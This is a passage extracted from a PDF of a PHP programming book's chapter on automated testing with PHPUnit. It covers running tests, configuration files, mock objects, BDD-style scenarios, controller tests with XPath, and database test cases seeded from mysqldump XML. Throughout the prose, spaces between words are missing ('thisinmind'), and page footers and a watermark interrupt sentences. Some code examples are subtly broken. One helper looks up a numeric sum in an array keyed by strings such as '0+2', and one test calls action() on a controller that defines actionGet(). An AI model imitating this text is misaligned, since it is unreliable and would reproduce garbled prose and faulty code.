andactual states differ .Keep thisinmind when youneed tomake anassertion, and
trytochoose themost specific assertion method foryour particular usecase. In
more complex ordomain-specific cases, itmay even make sense towrite your own
assertion methods.
Running T ests
Testsarerunusing thePHPUnit command linerunner included initsPEAR package,
phpunit. It’sinvoked from thecommand linethisway:
7http://www .phpunit.de/manual/current/en/writing-tests-for -phpunit.html#writing-tests-for -phpunit.as-
sertions
8http://php.net/assertPHP Master: W rite Cutting-edge Code 246
www.it-ebooks.info
phpunit My_CalculatorTest My/CalculatorTest.php
Remember themention ofcomplying with PEAR naming standards intheprevious
section? phpunit will attempt toderive itfrom theclass name based onthose
naming conventions ifnofilepath isspecified. Since thisexample complies with
those conventions, thefollowing example istheequivalent totheprevious one:
phpunit My_CalculatorTest
phpunit hasanumber ofuseful configuration options. Here areafewexamples:
--bootstrap <file> phpunit willinclude thePHP filespecified bythisoption
before executing testsuites. It’suseful forincluding
autoloaders andother initialization logic thatmust live
intheglobal scope.
-d key[=value] This enables aPHP configuration flag(forexample, -d
file_uploads9),orsetsthevalue ofaPHP configuration
setting (forexample, -d memory_limit=128M10).Itcanbe
specified multiple times tosetmultiple options.
--filter <pattern> This filters what testmethods arerunfrom thespecified
class byname orregular expression. It’sparticularly useful
forrunning individual testmethods while creating or
modifying them.
Ifyouuseseveral ofthese, their default values canbechanged using aPHPUnit
configuration file,11either bycreating afilenamed phpunit.xml inthecurrent
working directory orreferencing afileviaapath passed tothe-coption ofphpunit.
Here’ swhat abasic configuration filelooks like:
chapter_07/tests/phpunit.xml
<phpunit backupGlobals="true"
         backupStaticAttributes="false"
         <!--bootstrap="/path/to/bootstrap.php"-->
9http://php.net/manual/en/ini.core.php#ini.file-uploads
10http://php.net/manual/en/ini.core.php#ini.memory-limit
11http://www .phpunit.de/manual/current/en/appendixes.configuration.html247 Automated T esting
www.it-ebooks.info
         colors="false"
         convertErrorsToExceptions="true"
         convertNoticesToExceptions="true"
         convertWarningsToExceptions="true"
         forceCoversAnnotation="false"
         mapTestClassNameToCoveredClassName="false"
         processIsolation="false"
         stopOnError="false"
         stopOnFailure="false"
         stopOnIncomplete="false"
         stopOnSkipped="false"
         syntaxCheck="false"
         testSuiteLoaderClass="PHPUnit_Runner_ ➥
           StandardTestSuiteLoader"
         <!--testSuiteLoaderFile="/path/to/ ➥
           StandardTestSuiteLoader.php"-->
         strict="false"
         verbose="false">
  <!-- ⋮ -->
</phpunit>
When phpunit isrun, itdisplays aprogress indicator revealing how many test
methods have been executed andwhat theresults were. Once alltestmethods have
been run, itdisplays additional information onwhich tests failed andwhich asser -
tions caused them tofail.Ifthe+waschanged to–intheearlierMy_Calculator
example, thephpunit output might look likethis:
$ phpunit My/CalculatorTest.php 
PHPUnit 3.5.13 by Sebastian Bergmann. 
F.F 
Time: 0 seconds, Memory: 6.25Mb 
There were 2 failures: 
1) My_CalculatorTest::testAddBothPositive 
Failed asserting that <integer:1> matches expected <integer:5>. 
My/CalculatorTest.php:19 
2) My_CalculatorTest::testAddPositiveAndNegative 
Failed asserting that <integer:-2> matches expected <integer:0>. PHP Master: W rite Cutting-edge Code 248
www.it-ebooks.info
My/CalculatorTest.php:29 
FAILURES! 
Tests: 3, Assertions: 3, Failures: 2. 
IftheXdebug extension12isinstalled (seethesection called “Profiling” inChapter 6)
andthe--coverage-html option isspecified with adirectory path, acode coverage
report13iscreated inthatdirectory inHTML format. Thegenerated index.html file
provides asummary andnavigation toother report sections. This report shows for
each tested class thenumber oftimes each lineofcode isexecuted bythetestcase.
Ideally ,allclasses inyour project will have alllines executed atleast once—this is
called 100% coverage—though keep inmind thatthisdoesn’t necessarily mean that
unit tests fully cover your code.14
Test Doubles
Few useful applications have components thatoperate completely independently
from oneanother .Most have asetofsimple independent classes thatareused to-
gether byother dependent classes. Here’ sanexample ofadependent class thatuses
theearlier independent calculator class tocalculate atotal:
chapter_07/lib/T otaller .php
require_once dirname(__FILE__) . '/Calculator.php';
class My_Totaller
{
  private $calculator = null;
  private $operands = array();
  public function getCalculator()
  {
    if (empty($this->calculator)) {
      $this->calculator = new My_Calculator;
    }
    return $this->calculator;
12http://xdebug.org/
13http://www .phpunit.de/manual/current/en/code-coverage-analysis.html
14http://sebastian-bergmann.de/archives/913-T owards-Better -Code-Coverage-Metrics-in-the-PHP-
World.html249 Automated T esting
www.it-ebooks.info
  }
  public function setCalculator(My_Calculator $calculator)
  {
    $this->calculator = $calculator;
  }
  public function addOperand($operand)
  {
    $this->operands[] = $operand;
  }
  public function calculateTotal()
  {
    $calculator = $this->getCalculator();
    $total = 0;
    foreach ($this->operands as $operand) {
      $total = $calculator->add($total, $operand);
    }
    return $total;
  }
}
Asstated, thepurpose ofunit testing istotestcomponents inisolation from one
another .Sohow canunit tests bewritten fordependent classes?
Testdoubles15areobjects thatcanbeused inplace ofdependencies. PHPUnit
supports creating these with thegetMock() method ofthe
PHPUnit_Framework_TestCase class. This method hasonerequired parameter: the
name oftheclass forwhich togenerate atestdouble. Theobject returned by
getMock() isaninstance ofadynamically created subclass oftheoriginal class.
Because ofthat, itcanbeused inplace ofaninstance ofthatclass andoverride any
ofitsmethods notdeclared with thefinal ,private ,andstatic keywords. Let’s
look atanexample:
chapter_07/tests/T otallerT est.php
require_once '../lib/Totaller.php';
class My_TotallerTest extends PHPUnit_Framework_TestCase
15http://www .phpunit.de/manual/current/en/test-doubles.htmlPHP Master: W rite Cutting-edge Code 250
www.it-ebooks.info
{
  private $calculator;
  private $totaller;
  protected function setUp()
  {
    $this->calculator = $this->getMock('My_Calculator');
    $this->totaller = new My_Totaller;
    $this->totaller->setCalculator($this->calculator);
  }
  public function testCalculateTotal()
  {
    $this->calculator 
      ->expects($this->at(0)) 
      ->method('add') 
      ->with(0, 1) 
      ->will($this->returnValue(1)); 
    $this->calculator 
      ->expects($this->at(1)) 
      ->method('add') 
      ->with(1, 2) 
      ->will($this->returnValue(3)); 
    $this->calculator 
      ->expects($this->at(2)) 
      ->method('add') 
      ->with(3, 3) 
      ->will($this->returnValue(6)); 
    $this->totaller->addOperand(1);
    $this->totaller->addOperand(2);
    $this->totaller->addOperand(3);
    $this->assertEquals(6, $this->totaller->calculateTotal()); 
  }
}
InsetUp() ,atestdouble fortheMy_Calculator class iscreated andinjected into
aninstance ofMy_Totaller using itssetCalculator() method. Later ,when
testCalculateTotal() calls thecalculateTotal() method ofMy_Totaller ,that
method makes aninternal calltogetCalculator() ,which returns thetestdouble.
Bydefault, allmethods ofatestdouble will simply returnnull unless other logic
isdefined. Theprocess ofdefining thislogic isreferred toasstubbing or,incases
where thelogic includes verifying expectations such asamethod being called with251 Automated T esting
www.it-ebooks.info
specific parameter values, mocking .Tosupport this, PHPUnit provides afluent
interface—see thesection called “Fluent Interfaces” inChapter 1ifyou’re yettobe
familiar with these.
Theexpects() method callontheMy_Calculator testdouble accepts amatcher ,
which isanobject thatrepresents anexpectation regarding amethod call. For
expects() ,thatexpectation iseither how many times amethod will beexecuted
orareference toaspecific invocation ofamethod. Inthelatter case, thepurpose
ofreferring toaspecific invocation istoallow other expectations forittobespecified
further down thecallchain.PHPUnit_Framework_TestCase includes convenient
shorthand methods forobtaining matchers. Methods thatreturn matchers appropriate
forusewithexpects() aredocumented inthePHPUnit manual.16
Thenext callinthechain istothemethod() method, which merely specifies the
method ofthetestdouble that’sbeing mocked. Following thisisthewith() method
call, which isoptional andused toimplement constraints onparameter values.
Each parameter passed towith() corresponds totheparameter inthesame position
ofthemocked method, andcanbeeither amatcher orascalar value. Passing a
scalar value istheequivalent topassing thatvalue wrapped inacallto$this-
>equalTo() (defined inPHPUnit_Framework_Assert ),which returns amatcher that
checks forequivalence tothespecified value. Other appropriate matchers forwith()
aredocumented inthePHPUnit manual.17
Finally ,thewill() method callisused tospecify theresult ofthemethod call,
which inthiscase istoreturn agiven value indicated bythecallto$this->return-
Value() .Alternatives include returning different values forasequence ofconsecutive
calls using$this->onConsecutiveCalls() ,returning thevalue ofoneofthepara-
meters passed intheoriginal method callusing$this->returnArgument() ,or
throwing agivenException instance using$this->throwException() .These are
documented inthePHPUnit manual section onstubs.18Thepossibility ofexceptions
being thrown during interactions with external systems such asdatabase servers is
onethatisoften neglected intests. Asstated byNetflix inablog post19regarding
16http://www .phpunit.de/manual/current/en/test-doubles.html#test-doubles.mock-objects.tables.matchers
17http://www .phpunit.de/manual/current/en/writing-tests-for -phpunit.html#writing-tests-for -phpun-
it.assertions.assertThat.tables.constraints
18http://www .phpunit.de/manual/current/en/test-doubles.html#test-doubles.stubs
19http://techblog.netflix.com/2010/12/5-lessons-weve-learned-using-aws.htmlPHP Master: W rite Cutting-edge Code 252
www.it-ebooks.info
lessons itsteam learned inusing AWS,“the best way toavoid failure istofailcon-
sistently .”Keep thispoint inmind asyouwrite your own tests.
This chain ofmethod calls intheexample isused toindicate theparameter values
thatareexpected foreach invocation oftheadd() method ontheMy_Calculator
testdouble andthereturn value that’sexpected. Though theoriginal implementation
ofthismethod isfairly simple inthiscase, itcould hypothetically besignificantly
more complex inother examples. This illustrates amajor value oftestdoubles: the
ability toreduce potentially complex logic intoaseries ofexpectations forparameter
andreturn values. Theother major value isthattests forMy_Totaller operate inde-
pendently ofMy_Calculator ;ifthelatter changes, theformer isunaffected.
Forsome usecases, PHPUnit’ simplementation oftestdoubles canbelimited.
Other frameworks have surfaced tofillthisgap, twoinparticular being Phake20
andMockery .21Ifyoufind yourself inasituation where thenative functionality
provided byPHPUnit seems insufficient, these alternatives aredefinitely worth
exploring.
Writing T estable Code
Many common problems with writing code that’seasy totestcanbeavoided by
following twosimple principles.
Thefirstistoavoid writing methods thatcan’t bestubbed; thatis,methods declared
with anyofthefinal ,private ,andstatic keywords. Units ofcode thatcallsuch
methods cannot betested independently from them, making itmore difficult to
isolate thecause ofanissue.
Thesecond istoalways allow dependencies tobeinjected (formore ondependency
injection, seethesection called “Dependency Injection” inChapter 4).Thereasoning
forthisprinciple isthesame: ifadependency ishard-coded, theclass using itcan
nolonger betested independently from thatdependency ,rendering unit tests less
useful inlocating unexpected behavior .
Amethodology thatisvery conducive towriting testable code istest-driven devel-
opment ,often abbreviated toTDD. This process involves writing tests forcode before
20https://github.com/mlively/Phake
21https://github.com/padraic/mockery253 Automated T esting
www.it-ebooks.info
writing theactual code being tested, running thetests toverify thatthey fail,and
then writing code tomake thetests pass. Theadvantages ofthisaretwofold: first,
tests need tobewritten, asopposed topotentially being excluded from theproject
duetotight deadlines orother complications; second, tests force youtousetheAPI
ofthecode being tested, which canhelp toexpose design ortestability issues early
on.
Arelated methodology isbehavior -driven development orBDD, which extends
TDD byhaving testcases (orspecifications, asthey’re referred toinBDD) written
inanatural language understandable bynon-developers. PHPUnit ships with a
Story extension22thatadds support forBDD-style testing, which isused intheBDD
example thatfollows. Alternative options forPHP BDD testing frameworks include
Behat23andPHPSpec.24
Theidea behind BDD specifications istodescribe how code issupposed tobehave
using adomain-specific language25orDSL appropriate forthedomain orsubject
area associated with thecode being tested. Each specification contains three parts:
acontext, anevent, andanoutcome. When displayed, aspecification isformatted
likeso:
Given: [context]
And: [another context]
When: [event]
And: [another event]
Then: [outcome]
And: [another outcome]
Each lineinthisoutput isreferred toasastep.Andsteps aremerely repetitions of
theprevious type ofstep with adifferent value. Each potential value foracontext,
event, andoutcome must beprogrammatically defined. These definitions only need
tobeexpressed once tobeusable multiple times, which isamajor advantage tothis
style ofdevelopment. Let’slook atanexample:
22http://www .phpunit.de/manual/current/en/behaviour -driven-development.html
23http://behat.org/
24http://www .phpspec.net/
25http://en.wikipedia.org/wiki/Domain-specific_languagePHP Master: W rite Cutting-edge Code 254
www.it-ebooks.info
chapter_07/tests/T otallerBehavioralT est.php  (excerpt)
class My_TotallerBehavioralTest extends ➥
  PHPUnit_Extensions_Story_TestCase
{
  public function runGiven(&$world, $action, $arguments)
  {
    switch ($action)
    {
      case 'New totaller':
        $world['calculator'] = $this->getMock('My_Calculator');
        $world['calculator']
          ->expects($this->any())
          ->method('add')
          ->will($this->returnCallback(array($this, ➥
           'calculatorAdd')));
        $world['totaller'] = new My_Totaller();
        $world['totaller']->setCalculator($world['calculator']);
        break;
      default:
        return $this->notImplemented($action);
    }
  }
  public function calculatorAdd($a, $b)
  {
    static $sums = array(
      '0+2' => 2,
      '0+-1' => -1, 
      '2+3' => 5,
      '2+0' => 2,
      '-1+1' => 0,
    );
    $eqn = $a+$b;
    if (isset($sums[$eqn]))
    {
      return $sums[$eqn];
    }
    $this->fail("No known output for calculator inputs:". ➥
      $a . ", " . $b);
  }
  public function runWhen(&$world, $action, $arguments)255 Automated T esting
www.it-ebooks.info
  {
    switch ($action)
    {
      case 'Totaller receives operand':
        $world['totaller']->addOperand($arguments[0]);
        break;
      default:
        return $this->notImplemented($action);
    }
  }
  public function runThen(&$world, $action, $arguments)
  {
    switch ($action)
    {
      case 'Total should be':
        $this->assertEquals($arguments[0], ➥
          $world['totaller']->calculateTotal());
        break;
      default:
        return $this->notImplemented($action);
    }
  }
  // ⋮
}
Support forcontext, event, andoutcome values areimplemented inrunGiven() ,
runWhen() ,andrunThen() ,respectively .Each ofthese methods accepts three
parameters:
1.$world ispassed byreference andisused asastate container across allsteps of
agiven scenario, since they don’t deal with state directly
2.$action isthesupplied value forthecontext, event, oroutcome
3.$arguments isanarray ofarguments associated with thisspecific useof$action
runGiven() should handle reinitializing $world toaknown state fortheevents that
areabout tobeexecuted. runWhen() should execute those events onthestate rep-
resented in$world .Finally ,runThen() should apply assertions toensure that$world
isintheexpected state following theexecution oftheevents.PHP Master: W rite Cutting-edge Code 256
www.it-ebooks.info
Let’slook atanexample ofscenarios:
chapter_07/tests/T otallerBehavioralT est.php  (excerpt)
class My_TotallerBehavioralTest extends ➥
  PHPUnit_Extensions_Story_TestCase
{
  // ⋮
  /**
   * @scenario
   */
  public function sumOfTwoPositiveNumbersIsPositive()
  {
    $this
      ->given('New totaller')
       ->when('Totaller receives operand', 2)
        ->and('Totaller receives operand', 3)
       ->then('Total should be', 5);
  }
  /**
   * @scenario
   */
  public function sumOfAPositiveNumberAndZeroIsPositive()
  {
    $this
      ->given('New totaller')
       ->when('Totaller receives operand', 2)
        ->and('Totaller receives operand', 0)
       ->then('Total should be', 2);
  }
  /**
   * @scenario
   */
  public function sumOfEqualPositiveAndNegativeNumbersIsZero()
  {
    $this
      ->given('New totaller')
       ->when('Totaller receives operand', -1)
        ->and('Totaller receives operand', 1)
       ->then('Total should be', 0);
  }
}257 Automated T esting
www.it-ebooks.info
Theabove scenarios areequivalent toearlier example tests from thesection called
“TestDoubles” .Thenaming convention ofprefixing testmethods withtest donot
apply toscenarios; instead, a@scenario DocBlock tagisused todenote which
methods oftheclass areintended tofunction asscenarios.
Each calltothegiven() ,when() ,andthen() methods passes theappropriate values
for$action and$arguments toitscorresponding run*() method with thecurrent
value for$world .Theand() method merely actsasasemantic proxy tothelastof
these methods executed within thechain.
Output scenario names arebased ontheir corresponding method names. Foroutput
tobeformatted appropriately forBDD, execute acommand ofthisform using the
--story flag:
phpunit --story My/TotallerTest.php
Output forthisexample would look asfollows:
My_Totaller
 [x] Sum of two positive numbers is positive
   Given New totaller 
    When Totaller receives operand 2
     and Totaller receives operand 3
    Then Total should be 5
 [x] Sum of a positive number and zero is positive
   Given New totaller 
    When Totaller receives operand 2
     and Totaller receives operand 0
    Then Total should be 2
 [x] Sum of equal positive and negative numbers is zero
   Given New totaller 
    When Totaller receives operand -1
     and Totaller receives operand 1
    Then Total should be 0
Scenarios: 3, Failed: 0, Skipped: 0, Incomplete: 0.PHP Master: W rite Cutting-edge Code 258
www.it-ebooks.info
Testing for Views and Contr ollers
Acommon method ofdeveloping web applications involves using aModel-V iew-
Controller (MVC) framework toprovide structure andcommonly used components
upon which tobuild domain-specific logic. (Youcanrefer back tothesection called
“Model-V iew-Controller” inChapter 4inChapter 4forthefullMVC lowdown.) If
yourecall, models typically deal with data persisted inadatabase; thus, theapproach
we’ll belooking atinthesection called “Database Testing” isusually sufficient for
writing tests forthem. Writing tests forcontrollers andviews insuch anapplication
may belessstraightforward.
While implementations canvary significantly ,thefunction ofmost MVC controller
implementations istointeract with models, collect data, andpass thatdata offtoa
specific view fordisplay totheenduser.Inother words, thecontroller andview
aresomewhat coupled ,orinterdependent. Frameworks such asZend Framework26
recommend either testing controllers andviews together ornottesting views atall.
Before going toodeeply into theexample inthissection, it’sworth noting thatyou
should consult documentation andcommunity communications such asmailing
listsandforums toconfirm thatyour framework ofchoice hasnonative functionality
orextensions thatprovide thetypes offeatures used here. Theexamples shown in
thissection areintended toillustrate concepts independent ofanyparticular
framework.
Let's look atanexample controller:
chapter_07/lib/Foo.php
class My_Controller_Foo extends My_Controller_Base
{
  private $fooModel;
  private $view;
  public function setFooModel(My_Model_Foo $fooModel)
  {
    $this->fooModel = $fooModel;
  }
  public function getFooModel()
26http://blueparabola.com/blog/getting-started-zendtest259 Automated T esting
www.it-ebooks.info
  {
    if (empty($this->fooModel)) {
      $this->fooModel = new My_Model_Foo();
    }
    return $this->fooModel;
  }
  public function setView(My_View $view)
  {
    $this->view = $view;
  }
  public function getView()
  {
    if (empty($this->view)) {
      $this->view = new My_View();
    }
    return $this->view;
  }
  public function actionGet(array $params)
  {
    $fooModel = $this->getFooModel();
    $fooId = $params['fooId'];
    $fooData = $fooModel->get($fooId);
    $view = $this->getView();
    $view->assign($fooData);
    return $view->render('path/to/template');
  }
}
Note thatthiscontroller allows itsdependencies tobeinjected; thisallows mock
versions ofthese dependencies tobeinjected bytests. Theaction method
actionGet() uses these methods toobtain those dependencies, fetches arecord
identified byarequest parameter using themodel, passes thedata forthatrecord
totheview ,andreturns theresult ofrendering aspecific view template.
There aretwotypes oftests thatcanbewritten forcontrollers: unit tests andfunc-
tional tests.Theformer type (seethesection called “Unit Testing” )involves
mocking dependencies toconfirm thatthecontroller hasexpected interactions with
those dependencies. Thelatter type takes more ofablack boxapproach, focusing
ontesting acontroller’ sresponse output given asetofpredetermined input and
normal (that is,non-mocked) dependencies.PHP Master: W rite Cutting-edge Code 260
www.it-ebooks.info
Here’ sanexample ofwhat acontroller unit testmight look like:
chapter_07/tests/FooT est.php
class My_Controller_FooTest extends PHPUnit_Framework_TestCase
{
  private $controller;
  public function setUp()
  {
    $this->controller = new My_Controller_Foo();
  }
  public function testActionGet()
  {
    $fooId = '1';
    $fooData = array('bar' => 'baz');
    $response = 'bar = baz';
    $fooModel = $this->getMock('My_Model_Foo');
    $fooModel->expects($this->once())
      ->method('get')
      ->with($fooId)
      ->will($this->returnValue($fooData));
    $this->controller->setFooModel($fooModel);
    $view = $this->getMock('My_View');
    $view->expects($this->once())
      ->method('assign')
      ->with($fooData);
    $view->expects($this->once())
      ->method('render')
      ->with('path/to/template')
      ->will($this->returnValue($response));
    $this->controller->setView($view);
    $params = array('fooId' => $fooId);
    $this->assertEquals($response, $this->controller-> ➥
      action($params));
  }
}
Inthistestcase,setUp() isused toinstantiate thecontroller being tested and
testActionGet() isatestmethod corresponding totheaction method being tested.
Inthetestmethod, each dependency ismocked toperform assertions onwhich261 Automated T esting
www.it-ebooks.info
methods areinvoked andwhat parameter values they receive when invoked. Each
mock object isthen injected into thecontroller using itscorresponding set*()
method. Finally ,theaction method iscalled with apredetermined request parameter ,
andtheresponse itreturns ischecked forconformity totheexpected response.
Themain difference between thisunit testandanequivalent functional testisthat
thelatter would perform nomocking; itwould simply allow thecontroller touse
thesame defaults fordependencies provided byitsget*() methods. Afunctional
testcould also testrequest routing—that is,arequest foragiven URL results ina
specific controller action method being executed—but otherwise, itwould beexactly
thesame inthiscase.
Inboth cases, thisexample hasasignificant problem: ifaview template changes
even slightly ,theexpected response must change with it.This canmakes tests very
brittle, depending onhow often your view templates change.
Analternative tochecking forprecise equality totherendered view content asa
whole issearching thatcontent foroneormore specific indicators thattheoverall
operation hastheexpected result. Let's assume thattheview template referenced
intheearlier example displays aform toeditarecord fetched from themodel. The
aforementioned indicators ofasuccessful operation might beform fields populated
with appropriate values.
Aswith Selenium,27thepresence ofelements within theresponse isgenerally
checked using CSSorXPath locator expressions. Neither PHP norPHPUnit provides
native capability tohandle CSS expressions; thisrequires asupplemental library
likeZend_Dom_Query28from Zend Framework orphpQuery .29However ,PHP does
support XPath expressions natively initscore DOM extension.
Let’sassume your base testcase class contains code resembling thefollowing:
chapter_07/tests/T estCase.php
class My_TestCase extends PHPUnit_Framework_TestCase
{
  public function assertContainsXPath($html, $expr)
27http://seleniumhq.org/
28http://framework.zend.com/manual/en/zend.dom.query .html
29http://code.google.com/p/phpquery/PHP Master: W rite Cutting-edge Code 262
www.it-ebooks.info
  {
    $doc = new DOMDocument;
    $doc->loadHTML($html);
    $xpath = new DOMXPath($doc);
    return ($xpath->query($expr)->length > 0);
  }
}
We’llalso assume thattheexpected view output looks likethis:
<form method=”post” action=”/foo”>
  <label for=”bar”>Bar</label>
  <input type=”text” id=”bar” name=”bar” value=”baz” />
  <input type=”submit” value=”Submit” />
</form>
Yourtestsuite totesttheoutput oftheprevious controller example foratextfield
could bethis:
// tests/My/Controller/FooTest.php
class My_Controller_FooTest extends My_TestCase
{
  public function testActionGet()
  {
    // ⋮
    $response = $this->controller->action($params);
    $expr = '//input[@name=”bar” and @value=”baz”]';
    $this->assertContainsXpath($response, $expr);
  }
}
One other difference between unit andfunctional testing ofcontrollers isthat
functional tests may require database integration (seethesection called “Database
Integration” formore information). This section presents itforusewith Selenium,
butitcanbeapplied tocontroller tests aswell.
Database T esting
Once code gains dependencies thatareunable tobemocked—such asnoncore PHP
features, oraccess toasystem external tothecode such asadatabase server—tests263 Automated T esting
www.it-ebooks.info
forthatcode cease tobeunit tests. This isbecause thecode isnolonger being tested
inisolation.
Agood example ofthismight involve code thatinteracts with adatabase server .
While it’spossible toverify thatthecode attempts tosend queries tothedatabase
server under specific circumstances, such tests make assumptions about thedatabase
schema. Iftheschema changes, thetests aregoing tocontinue topass, which makes
them farlessuseful forexposing differences between theactual schema andthe
schema expected bythecode thatinteracts with it.Assuch, looking atwhat queries
areexecuted isineffective forthistype oftesting.
What’ sneeded isasystem toputthedatabase intoaknown state, execute code that
interacts with thatdatabase, andperform assertions onthedatabase state toensure
thattheexecuted code hadthedesired effect. Despite being known more widely as
aunit-testing framework, PHPUnit offers anextension forexactly thispurpose,
which thissection will useforitsexamples. Ifyouprefer adifferent solution, con-
sider PHPMachinist.30
Database T est Cases
ThePHPUnit Database extension31ismodeled after theDbUnit extension toJUnit,
thedefacto unit testing framework forJava. Itdoesn’t handle creating databases,
tables, oruser credentials; itoperates ontheassumption thatthey’re already setup.
Instead, itallows youtocreate database testcases, testcases thathandle using a
given connection toinitialize thedatabase with agiven data setrepresenting a
known database state before each testisrun.Italsoprovides assertions forcomparing
thecontents ofdatabases table against other data setsrepresenting anexpected state
after code isexecuted.
Let’slook atabare-bones example:
chapter_07/tests/DaoT est.php  (excerpt)
class My_DaoTest extends PHPUnit_Extensions_Database_TestCase
{
  /**
   * @return PHPUnit_Extensions_Database_DB_IDatabaseConnection
30https://github.com/stephans/phpmachinist
31http://www .phpunit.de/manual/current/en/database.htmlPHP Master: W rite Cutting-edge Code 264
www.it-ebooks.info
   */
  public function getConnection()
  {
    $pdo = new PDO('mysql:...');
    return $this->createDefaultDBConnection($pdo, 'database_name');
  }
  /**
   * @return PHPUnit_Extensions_Database_DataSet_IDataSet
   */
  public function getDataSet()
  {
    return $this->createFlatXMLDataSet(dirname(__FILE__) . ➥
      '/_files/seed.xml');
  }
}
Database testcases extend thePHPUnit_Extensions_Database_TestCase class. This
class hastwoabstract methods thatitssubclasses must implement: getConnection()
andgetDataSet() .Implementations ofthese areshown intheprevious example.
It’sagood practice tocreate abase database testcase specific toyour project that
implements these methods, andtohave allother database testcases extend upon
thattoavoid duplicating thiscode.
Connections
Inorder toinitialize thedatabase toaknown state, PHPUnit must first connect to
thedatabase server .ThegetConnection() method allows youtospecify exactly
how thatconnection should becreated. Theonly relevant aspect ofthismethod is
thatitmust return anobject thatimplements theinterfacePHPUnit_Extensions_Data-
base_DB_IDatabaseConnection .
TheDatabase extension provides astandard implementation ofthisinterface that
uses PDO (seeChapter 2):
PHPUnit_Extensions_Database_DB_DefaultDatabaseConnection .The
createDefaultDBConnection() method callsimply returns aninstance ofthisclass
initialized with theparameter values thatarepassed toit,aPDO connection tothe
database server ,andthename ofthedatabase being used.
Note thatthecode being tested bythetestcase isn’t expected tousePDO; it’smerely
what thedefault connection class uses toinitialize thedatabase with agiven data265 Automated T esting
www.it-ebooks.info
set.Incases when PDO isunavailable, youcanwrite aclass thatimplements the
same interface andhave thegetConnection() implementation inyour base database
testcase return aninstance ofthatclass instead.
Data Sets
Inaddition totheconnection, PHPUnit needs adata setwith which toseed orini-
tialize thedatabase prior toexecuting atestmethod against it.Data setsarealso
used when performing assertions against thedatabase state after thecode being
tested hasbeen executed. They canbecreated from several different sources:
Flat XML32This isasimple XML-based format, butcancause
issues with columns capable ofcontaining null
values.
XML This isamore complex XML-based format that
avoids theissues with null values thattheFlat
XML format has.
MySQL XML This isexcluded from documentation asof
PHPUnit 3.5.13, butisnatively supported asof
PHPUnit 3.5.0. Ituses theXML format ofthe
mysqldump utility thatcomes with theMySQL
database server .
YAML This combines thesimplicity oftheFlatXML
format with theavoidance ofissues with null
values oftheXML format, butrequires aSymfony
YAML library .33
CSV This isasimple andfairly portable format, but
each fileislimited tocontaining data forasingle
table.
Array34This avoids issues with null values andallows
data tobespecified inline intestcases, aswell as
32http://www .phpunit.de/manual/current/en/database.html#flat-xml-dataset
33http://components.symfony-project.org/yaml/
34http://www .phpunit.de/manual/current/en/database.html#array-datasetPHP Master: W rite Cutting-edge Code 266
www.it-ebooks.info
inexternal files. While itisn’t natively supported,
anexample implementation isincluded inthe
PHPUnit manual.
Query This produces adata setfrom querying adatabase.
Database This produces adata setfrom some orallofthe
tables inadatabase.
TheMySQL XML format isacommonly desired option, solet’slook atanexample
using that. Togenerate aseed file,execute acommand such asthefollowing:
mysqldump --xml -t -u [username] -p [database] [tables] > ➥
  /path/to/seed.xml
Substitute appropriate values for[username] ,[database] ,and/path/to/seed.xml
here.[tables] isanoptional space-delimited listoftables towhich thedump will
belimited; when it’sunspecified, alltables inthedatabase areincluded.
ThegetDataSet() implementation inyour database testcase tousethisXML file
would look asfollows, again with anappropriate value substituted for
/path/to/seed.xml :
public function getDataSet()
{
  return $this->createMySQLXMLDataSet('/path/to/seed.xml');
}
PHPUnit_Extensions_Database_TestCase offers convenient create*DataSet
shorthand methods toobtain data setinstances forsome oftheformats itsupports,
liketheMySQL XML format. Others require explicitly instantiating andconfiguring
aninstance oftheir respective classes. Consult theDatabase Testing chapter ofthe
PHPUnit manual35forspecifics onyour preferred format.
Theeasiest approach forseed data setsistocreate onefortheentire database with
theminimum amount ofdata needed toadequately testallcode using thatdatabase,
andtousethatseed data setforalldatabase testcases. Theoverhead ofinserting
data that’snotneeded foranygiven testcase isfairly negligible inmost cases.
35http://www .phpunit.de/manual/current/en/database.html#understanding-datasets-and-datatables267 Automated T esting
www.it-ebooks.info
Analternative approach istogenerate aseparate data setforeach database table,
andtomanually combine them into acomposite data set36inyourgetDataSet()
implementation. Let’ssaythatyouexecuted theabovemysqldump command once
pertable inyour database, andspecified thattable’ sname forthe[tables] paramet-
er,likeso:
mysqldump --xml -t -u [username] -p [database] table1 > ➥
  /path/to/table1.xml
⋮
mysqldump --xml -t -u [username] -p [database] tableN > ➥
  /path/to/tableN.xml
Now let’ssay,foraspecific database testcase, thatyouonly needed thetables
table1 andtable3 tobeseeded. YourgetDataSet() implementation forthattest
case might look asfollows:
chapter_07/tests/DaoT est.php  (excerpt)
class My_DaoTest extends PHPUnit_Extensions_Database_TestCase
{
  // ⋮
  /**
   * @return PHPUnit_Extensions_Database_DataSet_IDataSet
   */
  public function getDataSet()
  {
    $table1 = $this->createMySQLXMLDataSet('/path/to/table1.xml');
    $table3 = $this->createMySQLXMLDataSet('/path/to/table3.xml');
    $composite = new PHPUnit_Extensions_Database_DataSet_ ➥
      CompositeDataSet();
    $composite->addDataSet($table1);
    $composite->addDataSet($table3);
    return $composite;
  }
}
36http://www .phpunit.de/manual/current/en/database.html#composite-datasetPHP Master: W rite Cutting-edge Code 268
www.it-ebooks.info
Creating adata setforanindividual table isnodifferent than creating oneforan
entire database: simply callthecreateMySQLXMLDataSet() method andspecify the
filecontaining thedata forthedesired table. Consolidate multiple data setsbyin-
stantiating theclassPHPUnit_Extensions_Database_DataSet_CompositeDataSet
into acomposite data set,andpass those data setinstances individually toits
addDataSet() method. Atthatpoint, simply havegetDataSet() return thatcom-
posite data setinstance, anditwillbeused toseed thedatabase likeanyother data
setinstance.
Assertions
Aside from theassertions used, database testcases look alotlikeunit testcases;
setUp() andtearDown() areused thesame way,forexample. Atestcase imple-
mentation might look likethis:
chapter_07/tests/DaoT est.php  (excerpt)
class My_DaoTest extends PHPUnit_Extensions_Database_TestCase
{
  private $dao;
  // getConnection() and getDataSet() implementations from earlier ➥
       go here
  protected function setUp()
  {
    $this->dao = new My_Dao;
    // any other required setup – connecting to the database, etc.
  }
  public function testDoStuff()
  {
    $this->dao->doStuff();
    // asserting table row count
    $expected_row_count = 2;
    $actual_row_count = $this->getConnection()->getRowCount ➥
      ('table_name');
    $this->assertEquals($expected_row_count, $actual_row_count);
    // asserting table / query result set equality
    $expected_table = $this->createMySQLXMLDataSet ➥
      ('/path/to/expected_table.xml')269 Automated T esting
www.it-ebooks.info
      ->getTable('table_name');
    $actual_table = $this->getConnection()->createQueryTable ➥
      ('table_name',
      'SELECT * FROM table_name WHERE ...');
    $this->assertTablesEqual($expected_table, $actual_table);
  }
}
BythetimetestDoStuff() isexecuted, thedatabase testcase hasalready seeded
